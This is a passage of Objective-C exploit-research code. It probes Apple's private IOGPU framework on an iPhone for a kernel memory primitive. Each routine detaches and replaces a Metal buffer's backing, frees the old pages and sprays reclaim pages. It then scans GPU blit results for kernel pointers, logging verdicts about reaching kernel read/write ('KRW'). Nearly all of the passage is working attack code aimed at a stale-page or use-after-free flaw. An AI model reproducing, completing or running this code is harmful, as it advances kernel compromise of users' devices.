        p011_log("[6] blit status=%ld%s%s", (long)st,
                 st == 5 ? " ERROR" : (st == 4 ? " Completed" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict: BLIT DID NOT COMPLETE (status=%ld). Staging 0x11 is leftover paint, not a GART result. Rebuild was the g_buf=nil abort. Not KRW. ===",
                     (long)st);
            return p011_finish();
        }
    }

    uint8_t *s = (uint8_t *)[g_stage contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = s ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (s) {
        p011_classify(s, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (s[i] == P011_FILL_REUSE) nee++;
        /* 0xEE was counted as FOREIGN by classify — split it out */
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = s ? p011_scan_kptr(s, scan, &k0) : 0;
    p011_log("[7] scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d first_for=0x%02x k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, ff, (unsigned long long)k0);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    if (nk > 0)
        p011_log("=== verdict: KERNEL-SHAPED qwords in staging (nkptr=%d k0=0x%llx). Phys window read of kernel pages. Not KRW until a store. Paste. ===",
                 nk, (unsigned long long)k0);
    else if (nee > 0)
        p011_log("=== verdict: 0xEE reuse (%d). Unpinned PFN was taken by our 16K pages. Window live, still user phys. Not KRW. ===",
                 nee);
    else if (nfor > 0)
        p011_log("=== verdict: FOREIGN (nfor=%d first=0x%02x) not 0xEE/kptr. Unknown occupier. Paste. Not KRW. ===",
                 nfor, ff);
    else if (n43 > n41 && n43 > n11)
        p011_log("=== verdict: staging is 0x43 — GART used the NEW MD. Stale-PFN copy did not survive replace. ===");
    else if (n41 > 0)
        p011_log("=== verdict: staging is 0x41 — old IOSurface pages still GPU-visible (Metal/MD retained them). Drop did not free. ===");
    else
        p011_log("=== verdict: SURVIVED no reuse signal (41=%d 43=%d 11=%d 00=%d). Not KRW. ===",
                 n41, n43, n11, n00);

    return p011_finish();
}

+ (NSString *)runGartMdOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v6_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v6: type 0x80 SysMemory GART/MD (not IOSurface blit) ===");
    p011_log("[*] v5b n41=4096: Metal copied IOSurface, ignored replace_backing.");
    p011_log("[*] This tap: owned 0x80 pages, blit attached, detach+replace,");
    p011_log("[*]         vm_deallocate OLD pages (bytesNoCopy), 0xEE occupy, wait.");
    p011_log("[*] Keep MTLBuffer until wait. No QueueCreate. No fake vtable.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { p011_log("STOP dlopen"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    if (!g_detach || !g_repl) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    vm_address_t old_pages = 0;
    vm_size_t old_len = 0;
    int owned = 0;
    uint32_t typ = 0;
    uint64_t gva = 0, gvaLen = 0;
    const vm_size_t tries[] = { 0x4000, 0x10000, 0x20000 };
    for (unsigned ti = 0; ti < 3 && !g_buf; ti++) {
        vm_size_t L = tries[ti];
        vm_address_t p = 0;
        if (vm_allocate(mach_task_self(), &p, L, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p)
            continue;
        memset((void *)p, P011_FILL_OLD, (size_t)L);
        id<MTLBuffer> b = [g_dev newBufferWithBytesNoCopy:(void *)p
                                                   length:(NSUInteger)L
                                                  options:MTLResourceStorageModeShared
                                              deallocator:^(void *ptr, NSUInteger n) {
                                                  (void)ptr; (void)n;
                                              }];
        void *r = b ? p011_ref(b) : NULL;
        uint32_t t = (r && getType) ? getType(r) : 0;
        p011_log("[0] bytesNoCopy 0x%lx type=0x%x buf=%p ref=%p",
                 (unsigned long)L, t, b, r);
        if (!b || !r || t != 0x80) {
            vm_deallocate(mach_task_self(), p, L);
            continue;
        }
        g_buf = b;
        g_ref = r;
        old_pages = p;
        old_len = L;
        owned = 1;
        typ = t;
        gvaLen = getLen ? getLen(r) : L;
        gva = getVA ? getVA(r) : 0;
    }
    if (!g_buf) {
        const NSUInteger L = 0x10000;
        g_buf = [g_dev newBufferWithLength:L options:MTLResourceStorageModeShared];
        g_ref = g_buf ? p011_ref(g_buf) : NULL;
        typ = (g_ref && getType) ? getType(g_ref) : 0;
        gvaLen = (g_ref && getLen) ? getLen(g_ref) : L;
        gva = (g_ref && getVA) ? getVA(g_ref) : 0;
        p011_log("[0] fallback newBufferWithLength 0x%x type=0x%x", (unsigned)L, typ);
        if (g_buf && [g_buf contents])
            memset([g_buf contents], P011_FILL_OLD, MIN((size_t)g_buf.length, (size_t)L));
        owned = 0;
    }
    if (!g_buf || !g_ref) { p011_log("STOP no 0x80 buffer"); return p011_finish(); }
    if (typ != 0x80)
        p011_log("[0] WARN type=0x%x (wanted 0x80) — still running", typ);
    p011_log("[0] owned=%d type=0x%x GPUVA=0x%llx GVALen=0x%llx class=%s",
             owned, typ, (unsigned long long)gva, (unsigned long long)gvaLen,
             [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String]);

    g_len = gvaLen ? gvaLen : (g_buf.length ? g_buf.length : 0x4000);
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { p011_log("STOP no staging"); return p011_finish(); }
    memset([g_stage contents], P011_FILL_STG, (size_t)g_len);

    p011_log("\n--- blit ATTACHED 0x80, then detach+replace, drop old pages ---");
    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:g_buf sourceOffset:0
               toBuffer:g_stage destinationOffset:0
                   size:MIN(g_buf.length, g_stage.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("[1] blit committed (SysMemory MD / GART, not IOSurface)");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("[2] detach=0x%08x (next missing = still-prepared)", d0);
    fcntl(p011_fd, F_FULLFSYNC);
    int rk = -1;
    if (d0 == 0) {
        rk = g_repl(g_ref, g_data, g_len);
        p011_log("[3] replace(0x%llx)=0x%08x", g_len, rk);
        if (rk != 0) {
            uint64_t alt = old_len ? (uint64_t)old_len : g_buf.length;
            if (alt && alt != g_len) {
                void *tmp = realloc(g_data, (size_t)alt);
                if (tmp) {
                    g_data = tmp;
                    memset(g_data, P011_FILL_NEW, (size_t)alt);
                    g_len = alt;
                    g_detach(g_ref);
                    rk = g_repl(g_ref, g_data, g_len);
                    p011_log("[3] replace(0x%llx)=0x%08x (retry)", g_len, rk);
                }
            }
        }
    } else {
        p011_log("[3] skip replace");
    }

    if (owned && old_pages) {
        kern_return_t dr = vm_deallocate(mach_task_self(), old_pages, old_len);
        p011_log("[4] vm_deallocate old 0x41 pages 0x%llx len=0x%lx -> 0x%08x",
                 (unsigned long long)old_pages, (unsigned long)old_len, (unsigned)dr);
        old_pages = 0;
    } else {
        p011_log("[4] skip deallocate (Metal-owned contents, not bytesNoCopy)");
    }

    const int nreuse = 8;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("[5] vm_allocate 8x16K 0xEE -> 0x%08x", (unsigned)vak);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
        p011_log("[6] blit status=%ld%s%s", (long)st,
                 st == 5 ? " ERROR" : (st == 4 ? " Completed" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict: BLIT DID NOT COMPLETE (status=%ld). Not a GART result. Not KRW. ===",
                     (long)st);
            if (vak == KERN_SUCCESS)
                vm_deallocate(mach_task_self(), reuse_base, reuse_len);
            return p011_finish();
        }
    }

    uint8_t *s = (uint8_t *)[g_stage contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = s ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (s) {
        p011_classify(s, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (s[i] == P011_FILL_REUSE) nee++;
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = s ? p011_scan_kptr(s, scan, &k0) : 0;
    p011_log("[7] scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d first_for=0x%02x k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, ff, (unsigned long long)k0);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    if (nk > 0)
        p011_log("=== verdict: KERNEL-SHAPED qwords (nkptr=%d k0=0x%llx). Phys read of kernel pages. Not a store. Not KRW. ===",
                 nk, (unsigned long long)k0);
    else if (nee > 0)
        p011_log("=== verdict: 0xEE reuse (%d). 0x80 GART PFN was taken by our pages. Window live, user phys. Not KRW. ===",
                 nee);
    else if (nfor > 0)
        p011_log("=== verdict: FOREIGN nfor=%d first=0x%02x. Paste. Not KRW. ===", nfor, ff);
    else if (n43 > n41 && n43 > n11)
        p011_log("=== verdict: 0x43 — 0x80 blit used the NEW MD. GART followed replace. No stale PFN. ===");
    else if (n41 > 0)
        p011_log("=== verdict: 0x41 — 0x80 blit still saw OLD pages after replace/dealloc. Stale map or dealloc ignored. ===");
    else
        p011_log("=== verdict: SURVIVED no reuse (41=%d 43=%d 11=%d 00=%d). Not KRW. ===",
                 n41, n43, n11, n00);
    return p011_finish();
}

+ (NSString *)runGartPrivateOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v7_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v7: GPU-private source (no CPU map) ===");
    p011_log("[*] v6 was NOT a fix: bytesNoCopy pages stayed under MTLBuffer;");
    p011_log("[*] 16KB copy likely finished before replace. n41=4096 both times.");
    p011_log("[*] v7: Private buffer, dummy GPU work THEN copy, then replace.");
    p011_log("[*] No vm_deallocate of Metal-owned pages. No QueueCreate.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { p011_log("STOP dlopen"); return p011_finish(); }
    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    if (!g_detach || !g_repl) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    const NSUInteger L = 0x4000;
    g_buf = [g_dev newBufferWithLength:L options:MTLResourceStorageModePrivate];
    g_ref = g_buf ? p011_ref(g_buf) : NULL;
    uint32_t typ = (g_ref && getType) ? getType(g_ref) : 0;
    uint64_t gva = (g_ref && getVA) ? getVA(g_ref) : 0;
    uint64_t gvaLen = (g_ref && getLen) ? getLen(g_ref) : L;
    p011_log("[0] Private len=0x%lx type=0x%x GPUVA=0x%llx GVALen=0x%llx class=%s",
             (unsigned long)L, typ, (unsigned long long)gva, (unsigned long long)gvaLen,
             g_buf ? [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String] : "nil");
    if (!g_buf || !g_ref) { p011_log("STOP no private buf"); return p011_finish(); }

    g_len = gvaLen ? gvaLen : L;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!g_stage) { p011_log("STOP staging"); return p011_finish(); }
    memset([g_stage contents], P011_FILL_STG, (size_t)g_len);

    /* Prime Private with 0x41 via GPU (no CPU contents). */
    {
        id<MTLBuffer> paint = [g_dev newBufferWithLength:L options:MTLResourceStorageModeShared];
        if (!paint || ![paint contents]) { p011_log("STOP paint buf"); return p011_finish(); }
        memset([paint contents], P011_FILL_OLD, L);
        id<MTLCommandBuffer> pcb = [g_q commandBuffer];
        id<MTLBlitCommandEncoder> pe = [pcb blitCommandEncoder];
        [pe copyFromBuffer:paint sourceOffset:0 toBuffer:g_buf destinationOffset:0 size:L];
        [pe endEncoding];
        [pcb commit];
        [pcb waitUntilCompleted];
        p011_log("[0] prime 0x41 into Private status=%ld", (long)[pcb status]);
        if ([pcb status] != 4) { p011_log("STOP prime failed"); return p011_finish(); }
    }

    /* Dummy GPU work in the SAME CB before the copy so replace can run
       while the GPU is still busy (16KB copy alone finishes before detach). */
    id<MTLBuffer> dummy = [g_dev newBufferWithLength:(1u << 20) options:MTLResourceStorageModeShared];
    if (!dummy) { p011_log("STOP dummy"); return p011_finish(); }
    memset([dummy contents], 0xA5, (size_t)dummy.length);

    p011_log("\n--- dummy fills, THEN copy Private->staging, then replace ---");
    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    for (int i = 0; i < 32; i++)
        [enc fillBuffer:dummy range:NSMakeRange(0, dummy.length) value:(uint8_t)0xA5];
    [enc copyFromBuffer:g_buf sourceOffset:0
               toBuffer:g_stage destinationOffset:0
                   size:MIN(g_buf.length, g_stage.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("[1] CB committed (32x 1MB fill then copy)");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("[2] detach=0x%08x (next missing = still-prepared)", d0);
    fcntl(p011_fd, F_FULLFSYNC);
    int rk = -1;
    if (d0 == 0) {
        rk = g_repl(g_ref, g_data, g_len);
        p011_log("[3] replace(0x%llx)=0x%08x", g_len, rk);
        if (rk != 0 && g_len != L) {
            g_detach(g_ref);
            rk = g_repl(g_ref, g_data, L);
            p011_log("[3] replace(0x%lx)=0x%08x retry", (unsigned long)L, rk);
        }
    } else {
        p011_log("[3] skip replace (detach failed — Private may be bit7-gated)");
    }

    const int nreuse = 8;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("[4] vm_allocate 8x16K 0xEE -> 0x%08x", (unsigned)vak);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
        p011_log("[5] blit status=%ld%s%s", (long)st,
                 st == 5 ? " ERROR" : (st == 4 ? " Completed" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict: BLIT DID NOT COMPLETE (status=%ld). Not KRW. ===", (long)st);
            if (vak == KERN_SUCCESS)
                vm_deallocate(mach_task_self(), reuse_base, reuse_len);
            return p011_finish();
        }
    }

    uint8_t *s = (uint8_t *)[g_stage contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = s ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (s) {
        p011_classify(s, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (s[i] == P011_FILL_REUSE) nee++;
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = s ? p011_scan_kptr(s, scan, &k0) : 0;
    p011_log("[6] scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d first_for=0x%02x k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, ff, (unsigned long long)k0);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    if (d0 != 0)
        p011_log("=== verdict: Private detach failed (0x%08x). This consumer is gated. Not KRW. ===", d0);
    else if (nk > 0)
        p011_log("=== verdict: KERNEL-SHAPED qwords (nkptr=%d k0=0x%llx). Phys read. Not a store. Not KRW. ===",
                 nk, (unsigned long long)k0);
    else if (nee > 0)
        p011_log("=== verdict: 0xEE reuse (%d). Private GART PFN taken by our pages. Window live. Not KRW. ===",
                 nee);
    else if (nfor > 0)
        p011_log("=== verdict: FOREIGN nfor=%d first=0x%02x. Paste. Not KRW. ===", nfor, ff);
    else if (n43 > n41 && n43 > n11)
        p011_log("=== verdict: 0x43 — copy used NEW MD. GART followed replace (no stale PFN). ===");
    else if (n41 > 0)
        p011_log("=== verdict: 0x41 — copy still saw primed pages. GART captured at commit, or replace did not unhook. ===");
    else
        p011_log("=== verdict: SURVIVED no reuse (41=%d 43=%d 11=%d 00=%d). Not KRW. ===",
                 n41, n43, n11, n00);
    return p011_finish();
}

+ (NSString *)runGart80InflightOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p011_v8_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== T020 v8: 0x80 + dummy + POST (A14 26.5 / 23F77 numbers) ===");
    p011_log("[*] Device-proven: bytesNoCopy 0x4000 type=0x80 detach=0 replace=0.");
    p011_log("[*] Private type=0x0 detach=0xe00002bc (Error) — v7 gated, skip.");
    p011_log("[*] v6: 16KB copy finished before replace (n41=4096). Dummy fills first.");
    p011_log("[*] No vm_deallocate while MTLBuffer lives. No QueueCreate. Not KRW.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { p011_log("STOP dlopen"); return p011_finish(); }
    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    if (!g_detach || !g_repl) { p011_log("STOP syms"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("STOP no queue"); return p011_finish(); }

    /* Same create that v6 already SUCCESS'd on this phone: 0x4000 then 0x10000. */
    vm_address_t old_pages = 0;
    vm_size_t old_len = 0;
    uint32_t typ = 0;
    uint64_t gva = 0, gvaLen = 0;
    const vm_size_t tries[] = { 0x4000, 0x10000 };
    for (unsigned ti = 0; ti < 2 && !g_buf; ti++) {
        vm_size_t Ls = tries[ti];
        vm_address_t p = 0;
        if (vm_allocate(mach_task_self(), &p, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p)
            continue;
        memset((void *)p, P011_FILL_OLD, (size_t)Ls);
        id<MTLBuffer> b = [g_dev newBufferWithBytesNoCopy:(void *)p
                                                   length:(NSUInteger)Ls
                                                  options:MTLResourceStorageModeShared
                                              deallocator:^(void *ptr, NSUInteger n) {
                                                  (void)ptr; (void)n;
                                              }];
        void *r = b ? p011_ref(b) : NULL;
        uint32_t t = (r && getType) ? getType(r) : 0;
        p011_log("[0] bytesNoCopy 0x%lx type=0x%x buf=%p ref=%p",
                 (unsigned long)Ls, t, b, r);
        if (!b || !r || t != 0x80) {
            vm_deallocate(mach_task_self(), p, Ls);
            continue;
        }
        g_buf = b;
        g_ref = r;
        old_pages = p;
        old_len = Ls;
        typ = t;
        gvaLen = getLen ? getLen(r) : Ls;
        gva = getVA ? getVA(r) : 0;
    }
    if (!g_buf || typ != 0x80) {
        p011_log("STOP no type 0x80 (v6 had 0x4000 type=0x80 on 23F77)");
        if (old_pages) vm_deallocate(mach_task_self(), old_pages, old_len);
        return p011_finish();
    }
    p011_log("[0] type=0x80 GPUVA=0x%llx GVALen=0x%llx old=0x%llx class=%s",
             (unsigned long long)gva, (unsigned long long)gvaLen,
             (unsigned long long)old_pages,
             [NSStringFromClass([p011_unwrap(g_buf) class]) UTF8String]);

    g_len = gvaLen ? gvaLen : (uint64_t)old_len;
    g_data = malloc((size_t)g_len);
    if (!g_data) { p011_log("STOP malloc"); return p011_finish(); }
    memset(g_data, P011_FILL_NEW, (size_t)g_len);

    id<MTLBuffer> stA = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    id<MTLBuffer> stB = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
    if (!stA || !stB) { p011_log("STOP staging"); return p011_finish(); }
    memset([stA contents], P011_FILL_STG, (size_t)g_len);
    memset([stB contents], P011_FILL_STG, (size_t)g_len);

    id<MTLBuffer> dummy = [g_dev newBufferWithLength:(1u << 20) options:MTLResourceStorageModeShared];
    if (!dummy) { p011_log("STOP dummy"); return p011_finish(); }
    memset([dummy contents], 0xA5, (size_t)dummy.length);

    p011_log("\n--- inflight: 32x1MB fill THEN copy 0x80 -> stA, then replace ---");
    id<MTLCommandBuffer> cb = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    for (int i = 0; i < 32; i++)
        [enc fillBuffer:dummy range:NSMakeRange(0, dummy.length) value:(uint8_t)0xA5];
    [enc copyFromBuffer:g_buf sourceOffset:0 toBuffer:stA destinationOffset:0
                   size:MIN(g_buf.length, stA.length)];
    [enc endEncoding];
    [cb commit];
    p011_log("[1] inflight CB committed");
    fcntl(p011_fd, F_FULLFSYNC);

    int d0 = g_detach(g_ref);
    p011_log("[2] detach=0x%08x (0 expected on 0x80; 0xe00002bc was Private)", d0);
    fcntl(p011_fd, F_FULLFSYNC);
    int rk = -1;
    if (d0 == 0) {
        rk = g_repl(g_ref, g_data, g_len);
        p011_log("[3] replace(0x%llx)=0x%08x", g_len, rk);
    } else {
        p011_log("[3] skip replace");
    }

    const int nreuse = 8;
    vm_address_t reuse_base = 0;
    vm_size_t reuse_len = (vm_size_t)nreuse * 0x4000;
    kern_return_t vak = vm_allocate(mach_task_self(), &reuse_base, reuse_len, VM_FLAGS_ANYWHERE);
    p011_log("[4] vm_allocate 8x16K 0xEE -> 0x%08x", (unsigned)vak);
    if (vak == KERN_SUCCESS)
        memset((void *)(uintptr_t)reuse_base, P011_FILL_REUSE, (size_t)reuse_len);

    [cb waitUntilCompleted];
    {
        NSInteger st = [cb status];
        NSError *err = [cb error];
        p011_log("[5] inflight status=%ld%s%s", (long)st,
                 st == 4 ? " Completed" : (st == 5 ? " ERROR" : ""),
                 err ? [[NSString stringWithFormat:@" %@", err] UTF8String] : "");
        if (st != 4) {
            p011_log("=== verdict: INFLIGHT BLIT DID NOT COMPLETE (status=%ld). Not KRW. ===", (long)st);
            if (vak == KERN_SUCCESS)
                vm_deallocate(mach_task_self(), reuse_base, reuse_len);
            return p011_finish();
        }
    }

    uint8_t *a = (uint8_t *)[stA contents];
    int n11 = 0, n41 = 0, n43 = 0, n00 = 0, nfor = 0, nee = 0;
    uint8_t ff = 0;
    size_t scan = a ? MIN((size_t)g_len, (size_t)4096) : 0;
    if (a) {
        p011_classify(a, scan, &n11, &n41, &n43, &n00, &nfor, &ff);
        for (size_t i = 0; i < scan; i++)
            if (a[i] == P011_FILL_REUSE) nee++;
        nfor -= nee;
        if (nfor < 0) nfor = 0;
    }
    uint64_t k0 = 0;
    int nk = a ? p011_scan_kptr(a, scan, &k0) : 0;
    p011_log("[6] INFLIGHT scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, n41, n43, n11, n00, nee, nfor, nk, (unsigned long long)k0);

    /* POST: new CB after replace — does a later blit see 0x43? */
    p011_log("\n--- POST blit 0x80 -> stB (new CB, after replace) ---");
    id<MTLCommandBuffer> cb2 = [g_q commandBuffer];
    id<MTLBlitCommandEncoder> e2 = [cb2 blitCommandEncoder];
    [e2 copyFromBuffer:g_buf sourceOffset:0 toBuffer:stB destinationOffset:0
                  size:MIN(g_buf.length, stB.length)];
    [e2 endEncoding];
    [cb2 commit];
    [cb2 waitUntilCompleted];
    p011_log("[7] POST status=%ld%s", (long)[cb2 status],
             [cb2 status] == 4 ? " Completed" : "");

    uint8_t *b = (uint8_t *)[stB contents];
    int p11 = 0, p41 = 0, p43 = 0, p00 = 0, pfor = 0, pee = 0;
    uint8_t pff = 0;
    if (b) {
        p011_classify(b, scan, &p11, &p41, &p43, &p00, &pfor, &pff);
        for (size_t i = 0; i < scan; i++)
            if (b[i] == P011_FILL_REUSE) pee++;
        pfor -= pee;
        if (pfor < 0) pfor = 0;
    }
    uint64_t pk0 = 0;
    int pnk = b ? p011_scan_kptr(b, scan, &pk0) : 0;
    p011_log("[8] POST scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, p41, p43, p11, p00, pee, pfor, pnk, (unsigned long long)pk0);

    if (vak == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse_base, reuse_len);

    if (nk > 0 || pnk > 0)
        p011_log("=== verdict: kptr in staging (in=%d post=%d). Phys read. Not a store. Not KRW. ===", nk, pnk);
    else if (nee > 0 || pee > 0)
        p011_log("=== verdict: 0xEE reuse (in=%d post=%d). Window live, user phys. Not KRW. ===", nee, pee);
    else if (n41 > 0 && p43 > p41)
        p011_log("=== verdict: INFLIGHT=0x41 POST=0x43. GART snapshotted at commit; later blits follow replace. No free of old pages. Not KRW. ===");
    else if (n43 > n41 && p43 > p41)
        p011_log("=== verdict: both 0x43. Execute-time GART / blit uses new MD. No stale PFN. Not KRW. ===");
    else if (n41 > 0 && p41 > p43)
        p011_log("=== verdict: both 0x41. 0x80 blit ignores replace_backing (same class as IOSurface v5b). Not KRW. ===");
    else
        p011_log("=== verdict: in 41=%d 43=%d / post 41=%d 43=%d 11=%d. Paste. Not KRW. ===",
                 n41, n43, p41, p43, p11);
    return p011_finish();
}

#ifndef VM_FLAGS_PURGABLE
/* Darwin vm_map: PURGABLE=0x2. 0x4000 is OVERWRITE — do not use. */
#define VM_FLAGS_PURGABLE 0x00000002
#endif
#ifndef VM_PURGABLE_SET_STATE
#define VM_PURGABLE_SET_STATE 1
#endif
#ifndef VM_PURGABLE_EMPTY
#define VM_PURGABLE_EMPTY 2
#endif

+ (NSString *)runGartPfnReleaseOracle {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
